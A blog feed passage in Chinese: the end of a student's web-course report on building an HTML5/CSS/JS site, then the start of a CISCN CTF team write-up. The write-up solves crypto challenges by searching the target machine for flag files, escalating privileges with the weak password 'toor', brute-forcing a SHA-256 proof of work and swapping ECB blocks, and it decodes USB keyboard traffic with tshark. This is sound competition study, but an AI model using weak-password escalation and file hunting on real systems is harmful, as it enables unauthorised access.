×©</li><li>图像标签：<code>&lt;img src=&quot;&quot; width=&quot;&quot; height=&quot;&quot;/&gt;</code></li><li>表格：<code>&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</code></li><li>表单：<code>&lt;form&gt;&lt;lable for=&quot;A&quot;&gt;&lt;/lable&gt;&lt;input type=””placeholder=”” name=”A” id=”A” pattern=””/&gt;&lt;/form&gt;</code></li><li>列表：<code>&lt;ul&gt;&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ol&gt;&lt;li&gt;&lt;/li&gt;&lt;/ol&gt;&lt;dl&gt;&lt;dt&gt;&lt;dt&gt;&lt;/dd&gt;&lt;/dd&gt;&lt;/dl&gt;</code></li><li>音频：<code>&lt;audio&gt;&lt;/audio&gt;</code></li><li>视频：<code>&lt;video&gt;&lt;/video&gt;</code></li><li>浮动框架：<code>&lt;iframe&gt;&lt;/iframe&gt;</code></li></ol><p>HTML5是构建Web内容的一种语言描述方式。HTML5是互联网的下一代标准，是构建以及呈现互联网内容的一种语言方式．被认为是互联网的核心技术之一。在2012年已经形成稳定版本。</p><ul><li>全新结构元素：<ul><li>头部标签：<code>&lt;header&gt;&lt;/header&gt;</code></li><li>导航栏标签：<code>&lt;nav&gt;&lt;/nav&gt;</code></li><li>底部标签：<code>&lt;footer&gt;&lt;/footer&gt;</code></li></ul></li></ul><h4 id="1-4-CSS层叠样式表"><a href="#1-4-CSS层叠样式表" class="headerlink" title="1.4 CSS层叠样式表"></a>1.4 CSS层叠样式表</h4><p>层叠样式表(Cascading Style Sheets)是一种用来表现HTML或XML等文件样式的计算机语言。CSS不仅可以静态地修饰网页，还可以配合各种脚本语言动态地对网页各元素进行格式化。CSS 能够对网页中元素位置的排版进行像素级精确控制，支持几乎所有的字体字号样式，拥有对网页对象和模型样式编辑的能力。</p><p>一、CSS3</p><p>CSS3是CSS层叠样式表技术的升级版本，于1999年开始制订，2001年5月23日W3C完成了CSS3的工作草案，主要包括盒子模型、列表模块、超链接方式、语言模块、背景和边框、文字特效、多栏布局等模块</p><blockquote><p>使用方式：包括内联方式，嵌入方式，链接方式，导入方式</p></blockquote><p>内联方式指的是直接在 HTML 标签中的 style 属性中添加 CSS。内联方式引入 CSS 代码会导致 HTML 代码变得冗长，且使得代码难以维护。</p><p>嵌入方式的 CSS 只对当前的网页有效，当多个页面需要引入相同的 CSS 代码时，这样写会导致代码冗余，也不利于维护。</p><p>链接方式这是最常见的也是最推荐的引入 CSS 的方式。使用这种方式，所有的 CSS 代码只存在于单独的 CSS 文件中，所以具有良好的可维护性。并且所有的 CSS 代码只存在于 CSS 文件中，CSS 文件会在第一次加载时引入，以后切换页面时只需加载 HTML 文件即可。</p><p>在本次的项目中，由于导师所做要求，暨整个网站有一外部CSS文件控制所有页面的统一样式，每个页面的个别样式采用内部CSS。所以同时采用了以上三种使用方式。</p><ul><li>CSS选择器：<ul><li>标签选择器（全局）、类选择器（最多）、id选择器（锚点）</li><li>通配符选择器</li><li>并集选择器、交集选择器、后代选择器</li><li>伪类选择器 :first-child,:last-child,nth-of-type(n)</li><li>伪元素选择器 :link :hover :visited</li></ul></li><li>字体样式：<ul><li>字体大小：font-size</li><li>字体：font-family</li><li>字体粗细：font-weight</li></ul></li><li>文本外观<ul><li>文本颜色：color</li><li>文本行间距：line-height</li><li>文本对齐方式：text-align</li><li>首行缩进：text-indent:2em;</li><li>标识文本溢出：text-overflow:ellipsis;</li><li>文本格式：text-decoration: underline;</li></ul></li><li>背景：<ul><li>背景颜色：background-color</li><li>背景图片：background-image</li><li>背景图像平铺：background-repeat:no-repeat;</li><li>背景图像位置：background-position:center center;</li><li>背景图像固定：background-attachment:fixed;</li><li>背景图像大小：background-size:cover/ % %;</li></ul></li><li>表单：<ul><li>接收并处理表单数据的服务器程序的地址：action=”#”</li><li>提交方式：method=”post”</li><li>表单名称：name=””</li><li>表单控件form、select控件、textarea控件</li></ul></li><li>视频/音频：<ul><li>自动播放：autoplay:autoplay;</li><li>结束重新开始：loop:loop;</li><li>缓冲不足连接一个图像：poster:url();</li><li>静音播放：muted</li><li>显示按键：controls:controls;</li></ul></li><li>CSS媒体查询<ul><li>媒体查询旨在为不同的设备（显示器、平板电脑、手机等）定义不同的样式规则，使用媒体查询是一种流行的技术，可以向台式机、笔记本电脑、平板电脑和手机（例如 iPhone 和 Android 手机）提供定制的样式表。</li></ul></li></ul><h4 id="1-5-JavaScript和JQuery动态"><a href="#1-5-JavaScript和JQuery动态" class="headerlink" title="1.5 JavaScript和JQuery动态"></a>1.5 JavaScript和JQuery动态</h4><p>JavaScript（简称“JS”）是一种具有函数优先的轻量级，解释型或即时编译型的高级编程语言。虽然它是作为开发web页面的脚本语言而出名的，但是它也被用到了很多非浏览器环境中，JavaScript 基于原型编程、多范式的动态脚本语言，并且支持面向对象、命令式和声明式（如函数式编程）风格。</p><p>jQuery 是一个 JavaScript 库，也是一个JS文件。 JQ中封装实现了很多方法，让使用变得更加简单不再像js那样需要使用大量的方法调用。但JQ也只是实现了一些方法，还有些没有实现，因此能够使用JQ是实现的，JS都能做，但是能够用JS做的，JQ不一定能够实现。</p><h3 id="2-网站的设计与实现"><a href="#2-网站的设计与实现" class="headerlink" title="2.网站的设计与实现"></a>2.网站的设计与实现</h3><h4 id="2-1-index-html"><a href="#2-1-index-html" class="headerlink" title="2.1 index.html"></a>2.1 index.html</h4><ul><li><p>头部和导航栏：</p><p>在整个项目中Header及footer的内容都是一致的，增加了代码的复用性，又增强了整个网页格式的统一。</p><p>在index页面中，存在整个项目唯一的nav元素，主要原因在于在实现过程中，我将Header元素用作链接整体，就淡化了<code>&lt;nav&gt;</code>标签的作用。</p><p>可以注意到在第二行右侧，出现了几个圆形图标，在这里是引入iconfont.ttf图标文字库代替图标图片。因为目前为止项目后端并没有完成，班列定制，APP下载等功能并没有进行开发。</p></li><li><p>banner块布局</p><p>在这一块引入了内嵌的JS代码做了一个简单地JS动态窗口，具体体现就是在banner块的中央位置插入了我一句比较喜欢的名言，也是我博客上所展示的”从来没有真正的绝境, 只有心灵的迷途”,”Never really desperate, only the lost of the soul”。</p><p>Banner块的底部通过CSS修饰，通过button按钮，页内超连接，与img图片属性制作出一个向下开启绿色生活的跳转样式。</p><img src="./Web大作业/1.png" style="zoom: 67%;" /><center>2.1 绿动出行主业</center></li><li><p>主体DIV块布局</p><p>该页面主题我采用了三列的弹性盒，在左右两栏通过CSS的:hover 选择器设置，鼠标悬停效果和动画，在鼠标选中时，通过css动画将原本置于页面左右两侧，背景和字体颜色都通过RGBA设为透明的两个块，通过transition: all 0.5s ease-in 0s;以及改变透明度的方式呈现出动画效果</p><p>中间列，通过JS与JQ实现了一个多图轮播机制，通过index.js代码进行控制实现页面的展示效果的增强。</p><img src="./Web大作业/2.png" style="zoom:67%;" /><center>2.2 多图轮播页面</center></li><li><p>Footer页面设置</p><p>在footer页面展示稍微少一些，这边我实际上只是采用了表格和图片进行了样式修饰，没有太多的其他效果。</p></li><li><p>全页效果</p><p>页面采用了css3媒体查询的方式，在窗口大小过小时整体会呈现出一个单列布局（图2.1-3 在手机端单列布局的展示），采用<code>&lt;source&gt;</code>标签进行背景音频的播放。</p><p><img src="./Web%E5%A4%A7%E4%BD%9C%E4%B8%9A/3.png"></p><center>2.3 媒体查询下效果</center></li></ul><h4 id="2-2-project-html"><a href="#2-2-project-html" class="headerlink" title="2.2 project.html"></a>2.2 project.html</h4><img src="./Web大作业/4.png" style="zoom:67%;" /><center>2.4 project.html</center>这个页面因为一些对老师要求的理解失误，这个页面便采用的是外部链接样式+内部CSS样式上，通过cards和card标签为下方图片增加卡片效果，同时也采用了一些简单的媒体查询，会在屏幕大小较小是将其改为单列图片。<h4 id="2-3-about-html"><a href="#2-3-about-html" class="headerlink" title="2.3 about.html"></a>2.3 about.html</h4><p>这一个页面也是整体多是CSS做的显示内容，通过背景和容器两层标签的使用，在container块中依次通过居中，设置内边距与外边距完成整体的样式设计。使背景正好覆盖整个页面的上半部分，文字和视频部分居中。</p><img src="./Web大作业/5.png" style="zoom:67%;" /><center>图2.5 关于我们页面</center>#### 2.4 login.html<p>这一个登录和注册页面其实并没有采用表单，只是通过修饰的两列输入栏，通过内置的js代码进行匹配，当鼠标点击对应位置时js代码段对content标签进行验证，将其改为对应的显示。</p><img src="./Web大作业/6.png" style="zoom:67%;" /><center>图2.6 登录页面</center>#### 2.5 information_acquisition.html<p>这个页面实际上是最初没有的，到现在也跟整个项目有些格格不入，在这个页面内，通过表格和表单嵌套使用做出整体美观的显示，之后通过HTML代码和JS代码进行输入验证。</p><ul><li><p>HTML验证:</p><p>由于HTML5有很多全新的表单控件，比如input type=”email” ，在这些控件在进行HTML代码会自动对其进行合法性验证，同时在不具备自动验证的块，通过设置正则表达式完成对块数据的验证如：pattern=”^[\u4e00-\u9fa5]{0,}$”这就是一个判断是否为中文的验证。</p></li><li><p>JS输入验证：</p><p>因为是临时赶工做出来的页面，我对其要求也有所降低，JS验证是通过在每个需要进行验证的输入栏后面设置一个空的块，块里不赋值，在点击注册后表单通过onsubmit=”return validateForm()”将数据传递给页面内的js validateForm()函数对其进行空值验证。</p></li></ul><img src="./Web大作业/7.png" style="zoom:67%;" /><h4 id="2-6-user-html"><a href="#2-6-user-html" class="headerlink" title="2.6 user.html"></a>2.6 user.html</h4><p>这个页面也是在最后跟老师的实验要求进行对比后再补充的一个页面，具体采用了列表加浮动框架的方式进行设计，在列表左侧为链接栏目，通过在链接栏中选择页面，会加载到右侧的浮动框架中。</p><img src="./Web大作业/8.png" style="zoom:67%;" /><h3 id="3-总结"><a href="#3-总结" class="headerlink" title="3 总结"></a>3 总结</h3><p>这个站点实际上是我大一初学web前段的目的，当时我和其他几位同学一起参加挑战杯，这个站点和其相应功能是当时没有完成制作出来，虽然现在为止，比如班列定制等功能也没有写出来，至少在前段展示上比当时好了很多。</p><p>另一方面在这一次我其实参考了不少的企业页面，因为这个是一个正经的参加挑战杯和大创的项目介绍，不能做到类似于博客，很多花式的前段效果在这个页面上其实不是很合适。也有很多不够圆满的地方，比如project页面，那四个cord块实际应该链接到项目提供的四项功能，但是两年过去，这些地方还没写完…..</p><p>最后呢，是对老师要求的一些理解失误，比如说那个使用以个外部CSS文件，在后面与老师交流时，刘老师表示是至少一个外部CSS文件而我理解成了只能使用一个外部CSS文件，这是不符合正常的程序设计原则的….所以导致我采用了一种外部CSS样式存储如header，footer，body等标签样式，每个页面中的具体采用的则交给内部CSS样式进行控制。</p><blockquote><p>写在最后，这个大作业还是费了很多力气的，主要是因为老师那些神奇的要求，这边也把本次老师要求附上……</p></blockquote><pre class="line-numbers language-none"><code class="language-none">1、网站内容丰富（包括各种类型的内容：文本、图像、音频、视频等）、功能完备（至少有五个栏目）。（20分）2、HTML代码结构清晰、规范（至少主页包括HTML5新增的结构元素）。（16分）3、整个网站有一外部CSS文件控制所有页面的统一样式，每个页面的个别样式采用内部CSS。（CSS代码书写规范，选择器使用及代码书写顺序合理）（16分）4、网站整体采用HTML+CSS方式布局页面（至少在一个页面采用浮动框架、至少在一个页面采用多列弹性盒、至少在一个页面使用CSS表格），页面布局合理。（18分）5、网站至少包含一个表单页面，表单页面中至少有一个输入栏位采用JS进行合法性验证，并采用pattern。（16）6、至少包含一个动画（CSS）或动态窗口（JS）或CSS响应式设计，至少在一页页面上设置动态样式。（8分）7、目录结构规范、文件名命名规范、各种标识符命名规范。（6分）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这玩意因为我一开始也没怎么考虑这些内容，然后…..看见这个之后大改……..</p>]]></content>
      
      
      <categories>
          
          <category> 项目设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 课程论文 </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Debuggerrr²战队CISCN初赛解题记录</title>
      <link href="/2022/06/09/Debuggerrr%C2%B2%E6%88%98%E9%98%9FCISCN%E5%88%9D%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2022/06/09/Debuggerrr%C2%B2%E6%88%98%E9%98%9FCISCN%E5%88%9D%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><strong>Crypto</strong></h2><h4 id="签到电台"><a href="#签到电台" class="headerlink" title="签到电台"></a><strong>签到电台</strong></h4><p>签到题，开始没看到豪密剖析，对照密码表一个一个找的，额。将7个电码和密码本前28个数字每四个一组进行模十加法，看示例是加猜测全部是加运算，得到电码答案后send即可。 </p><h4 id="基于挑战码的双向认证"><a href="#基于挑战码的双向认证" class="headerlink" title="基于挑战码的双向认证"></a><strong>基于挑战码的双向认证</strong></h4><p>密码学题目，但完全不是以密码学方法完成的…该题是一道双向验证密文题目，根据题目文档进入 src/login_user 模块，分析<code>proc_login_response</code>函数。一顿分析后发现很多函数看不懂，突然想到题目说明服务端验证函数已完成，找到<code>login_server</code>模块进入查看函数，对照两函数，但是不知道怎么计算<code>Mb</code>来和 <code>Mb</code>对比，思路线索断了。</p><p>题目存在flag验证机制，猜测靶机存在flag文件，开始暴力查找。 </p><p>首先尝试文件名搜索，排除若干无权限文件得到两个 txt 文件，尝试提交，正确。</p><h4 id="基于挑战码的双向认证2"><a href="#基于挑战码的双向认证2" class="headerlink" title="基于挑战码的双向认证2"></a><strong>基于挑战码的双向认证2</strong></h4><p>同上。 </p><h4 id="基于挑战码的双向认证3"><a href="#基于挑战码的双向认证3" class="headerlink" title="基于挑战码的双向认证3"></a><strong>基于挑战码的双向认证3</strong></h4><p>采取前两道题的思路，无果。 尝试弱密码**(toor)**，提权成功，再次暴力搜索找到flag文件。</p><h4 id="ISO9798"><a href="#ISO9798" class="headerlink" title="ISO9798"></a><strong>ISO9798</strong></h4><p>看提示ISO9798-2，额。。没怎么接触过，直接nc看题，发现得知sha256的后部分，直接爆破。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib data<span class="token operator">=</span> <span class="token string">'Gt1DDTjUUYIuQscO'</span> res <span class="token operator">=</span> <span class="token string">'e9e04036a480e68bb4d3897939bafd6dec3767ac9d552d17e000709ac08fefa7'</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>             <span class="token keyword">for</span> m <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                 s <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token operator">+</span> data                 <span class="token keyword">if</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> res<span class="token punctuation">:</span>                     <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>                     <span class="token keyword">break</span> s <span class="token operator">=</span> <span class="token string">'YWAVGt1DDTjUUYIuQscO'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第二步提示发送一个128bit的16进制数，python随机生成一个。 </p><p>第三步给了Encrypt(rA||rB||B, k)，要求给出Encrypt(rB||rA, k)，并未给出加密函数，因此猜测是在明 </p><p>文上动一些手脚即可。猜测为ECB或者CBC轮换加密。 </p><p>最后根据加密结果为96位，并且轮换参数有rA，rB，B三个，猜测为ECB加密并且分三组轮换，因此 </p><p>rA,rB和B分别对应密文三部分，要求Encrypt(rB||rA, k)，只需取给出密文的前64位倒置轮换即可。 </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">'83368a8ab47877c4e739d1455a6f15211716f83438b58feba5a83f3c3a5c5774847790a60378dbb 4f39c6400337bbe8c'</span> <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">:</span><span class="token number">64</span><span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">)</span> res <span class="token operator">=</span> <span class="token string">'1716f83438b58feba5a83f3c3a5c577483368a8ab47877c4e739d1455a6f1521'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a><strong>PWN</strong></h2><h4 id="login-nomal"><a href="#login-nomal" class="headerlink" title="login-nomal"></a><strong>login-nomal</strong></h4><p>拿到文件后，首先 check 一下保护措施,全绿…保护全开</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a><strong>Misc</strong></h2><h4 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a><strong>问卷调查</strong></h4><p>问卷结束后得flag。</p><h4 id="ez-usb"><a href="#ez-usb" class="headerlink" title="ez_usb"></a><strong>ez_usb</strong></h4><p>首先题目给的提示是这个是键盘流量，那么我们搜索8个字节长度的数据包，这里发现有两个Destination的数据包的长度是8，说明键盘给两个地方输入了值。</p><p> 利用tshark分别提取出压缩包和压缩密码</p><pre class="line-numbers language-none"><code class="language-none">tshark -r .&#x2F;ez_usb.pcapng -Y &#39;usb.data_len &#x3D;&#x3D; 8&#39; -Y &#39;usb.src &#x3D;&#x3D;&quot;2.8.1&quot;&#39; -T fields -e usb.capdata &gt; 1.txttshark -r .&#x2F;ez_usb.pcapng -Y &#39;usb.data_len &#x3D;&#x3D; 8&#39; -Y &#39;usb.src &#x3D;&#x3D;&quot;2.10.1&quot;&#39; -T fields -e usb.capdata &gt; 2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>再利用脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">normalKeys <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"04"</span><span class="token punctuation">:</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span><span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span class="token punctuation">:</span><span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span><span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span><span class="token string">"e"</span><span class="token punctuation">,</span> <span class="token string">"09"</span><span class="token punctuation">:</span><span class="token string">"f"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span><span class="token string">"g"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span><span class="token string">"h"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span><span class="token string">"i"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span><span class="token string">"j"</span><span class="token punctuation">,</span> <span class="token string">"0e"</span><span class="token punctuation">:</span><span class="token string">"k"</span><span class="token punctuation">,</span> <span class="token string">"0f"</span><span class="token punctuation">:</span><span class="token string">"l"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span><span class="token string">"m"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span><span class="token string">"n"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span><span class="token string">"o"</span><span class="token punctuation">,</span> <span class="token string">"13"</span><span class="token punctuation">:</span><span class="token string">"p"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span><span class="token string">"q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span><span class="token string">"r"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span><span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span><span class="token string">"t"</span><span class="token punctuation">,</span> <span class="token string">"18"</span><span class="token punctuation">:</span><span class="token string">"u"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span><span class="token string">"v"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span><span class="token string">"w"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span><span class="token string">"x"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span><span class="token string">"y"</span><span class="token punctuation">,</span> <span class="token string">"1d"</span><span class="token punctuation">:</span><span class="token string">"z"</span><span class="token punctuation">,</span><span class="token string">"1e"</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span><span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"20"</span><span class="token punctuation">:</span><span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span><span class="token string">"4"</span><span class="token punctuation">,</span> <span class="token string">"22"</span><span class="token punctuation">:</span><span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span><span class="token string">"6"</span><span class="token punctuation">,</span><span class="token string">"24"</span><span class="token punctuation">:</span><span class="token string">"7"</span><span class="token punctuation">,</span><span class="token string">"25"</span><span class="token punctuation">:</span><span class="token string">"8"</span><span class="token punctuation">,</span><span class="token string">"26"</span><span class="token punctuation">:</span><span class="token string">"9"</span><span class="token punctuation">,</span><span class="token string">"27"</span><span class="token punctuation">:</span><span class="token string">"0"</span><span class="token punctuation">,</span><span class="token string">"28"</span><span class="token punctuation">:</span><span class="token string">"&lt;RET>"</span><span class="token punctuation">,</span><span class="token string">"29"</span><span class="token punctuation">:</span><span class="token string">"&lt;ESC>"</span><span class="token punctuation">,</span><span class="token string">"2a"</span><span class="token punctuation">:</span><span class="token string">"&lt;DEL>"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span><span class="token string">"\t"</span><span class="token punctuation">,</span><span class="token string">"2c"</span><span class="token punctuation">:</span><span class="token string">"&lt;SPACE>"</span><span class="token punctuation">,</span><span class="token string">"2d"</span><span class="token punctuation">:</span><span class="token string">"-"</span><span class="token punctuation">,</span><span class="token string">"2e"</span><span class="token punctuation">:</span><span class="token string">"="</span><span class="token punctuation">,</span><span class="token string">"2f"</span><span class="token punctuation">:</span><span class="token string">"["</span><span class="token punctuation">,</span><span class="token string">"30"</span><span class="token punctuation">:</span><span class="token string">"]"</span><span class="token punctuation">,</span><span class="token string">"31"</span><span class="token punctuation">:</span><span class="token string">"\\"</span><span class="token punctuation">,</span><span class="token string">"32"</span><span class="token punctuation">:</span><span class="token string">"&lt;NON>"</span><span class="token punctuation">,</span><span class="token string">"33"</span><span class="token punctuation">:</span><span class="token string">";"</span><span class="token punctuation">,</span><span class="token string">"34"</span><span class="token punctuation">:</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">"35"</span><span class="token punctuation">:</span><span class="token string">"&lt;GA>"</span><span class="token punctuation">,</span><span class="token string">"36"</span><span class="token punctuation">:</span><span class="token string">","</span><span class="token punctuation">,</span><span class="token string">"37"</span><span class="token punctuation">:</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token string">"38"</span><span class="token punctuation">:</span><span class="token string">"/"</span><span class="token punctuation">,</span><span class="token string">"39"</span><span class="token punctuation">:</span><span class="token string">"&lt;CAP>"</span><span class="token punctuation">,</span><span class="token string">"3a"</span><span class="token punctuation">:</span><span class="token string">"&lt;F1>"</span><span class="token punctuation">,</span><span class="token string">"3b"</span><span class="token punctuation">:</span><span class="token string">"&lt;F2>"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span><span class="token string">"&lt;F3>"</span><span class="token punctuation">,</span><span class="token string">"3d"</span><span class="token punctuation">:</span><span class="token string">"&lt;F4>"</span><span class="token punctuation">,</span><span class="token string">"3e"</span><span class="token punctuation">:</span><span class="token string">"&lt;F5>"</span><span class="token punctuation">,</span><span class="token string">"3f"</span><span class="token punctuation">:</span><span class="token string">"&lt;F6>"</span><span class="token punctuation">,</span><span class="token string">"40"</span><span class="token punctuation">:</span><span class="token string">"&lt;F7>"</span><span class="token punctuation">,</span><span class="token string">"41"</span><span class="token punctuation">:</span><span class="token string">"&lt;F8>"</span><span class="token punctuation">,</span><span class="token string">"42"</span><span class="token punctuation">:</span><span class="token string">"&lt;F9>"</span><span class="token punctuation">,</span><span class="token string">"43"</span><span class="token punctuation">:</span><span class="token string">"&lt;F10>"</span><span class="token punctuation">,</span><span class="token string">"44"</span><span class="token punctuation">:</span><span class="token string">"&lt;F11>"</span><span class="token punctuation">,</span><span class="token string">"45"</span><span class="token punctuation">:</span><span class="token string">"&lt;F12>"</span><span class="token punctuation">&#125;</span>shiftKeys <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"04"</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span><span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span class="token punctuation">:</span><span class="token string">"C"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span><span class="token string">"D"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span><span class="token string">"E"</span><span class="token punctuation">,</span> <span class="token string">"09"</span><span class="token punctuation">:</span><span class="token string">"F"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span><span class="token string">"G"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span><span class="token string">"H"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span><span class="token string">"I"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span><span class="token string">"J"</span><span class="token punctuation">,</span> <span class="token string">"0e"</span><span class="token punctuation">:</span><span class="token string">"K"</span><span class="token punctuation">,</span> <span class="token string">"0f"</span><span class="token punctuation">:</span><span class="token string">"L"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span><span class="token string">"M"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span><span class="token string">"N"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span><span class="token string">"O"</span><span class="token punctuation">,</span> <span class="token string">"13"</span><span class="token punctuation">:</span><span class="token string">"P"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span><span class="token string">"Q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span><span class="token string">"R"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span><span class="token string">"S"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span><span class="token string">"T"</span><span class="token punctuation">,</span> <span class="token string">"18"</span><span class="token punctuation">:</span><span class="token string">"U"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span><span class="token string">"V"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span><span class="token string">"W"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span><span class="token string">"X"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span><span class="token string">"Y"</span><span class="token punctuation">,</span> <span class="token string">"1d"</span><span class="token punctuation">:</span><span class="token string">"Z"</span><span class="token punctuation">,</span><span class="token string">"1e"</span><span class="token punctuation">:</span><span class="token string">"!"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span><span class="token string">"@"</span><span class="token punctuation">,</span> <span class="token string">"20"</span><span class="token punctuation">:</span><span class="token string">"#"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span><span class="token string">"$"</span><span class="token punctuation">,</span> <span class="token string">"22"</span><span class="token punctuation">:</span><span class="token string">"%"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span><span class="token string">"^"</span><span class="token punctuation">,</span><span class="token string">"24"</span><span class="token punctuation">:</span><span class="token string">"&amp;"</span><span class="token punctuation">,</span><span class="token string">"25"</span><span class="token punctuation">:</span><span class="token string">"*"</span><span class="token punctuation">,</span><span class="token string">"26"</span><span class="token punctuation">:</span><span class="token string">"("</span><span class="token punctuation">,</span><span class="token string">"27"</span><span class="token punctuation">:</span><span class="token string">")"</span><span class="token punctuation">,</span><span class="token string">"28"</span><span class="token 